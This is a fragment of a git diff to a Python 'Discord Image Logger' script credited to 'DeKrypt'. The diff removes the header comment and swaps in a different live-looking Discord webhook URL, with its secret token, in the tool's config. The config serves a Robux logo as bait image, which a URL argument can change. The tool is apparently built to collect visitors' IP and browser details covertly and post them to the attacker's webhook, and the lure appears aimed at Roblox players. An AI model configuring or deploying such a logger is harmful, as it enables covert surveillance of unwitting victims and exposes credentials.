@@ -1,6 +1,3 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
-
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
@@ -12,7 +9,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1128502483866619934/be9pdDNtWdxQ9yitrd6Hi5bqvPc2oFor3eGoOWxMmxbY43bDBaQK_hpOVO-Zi3pmmS9V",
+    "webhook": "https://discord.com/api/webhooks/1131689746918281328/cCzDkZwrx8uzIPpNdP0UI2DuFvKlSQf1gcYshjDDmkoiRWnNM1MBfkfkcLIx2pd8lnpg",
     "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Robux_2019_Logo_gold.svg/1200px-Robux_2019_Logo_gold.svg.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
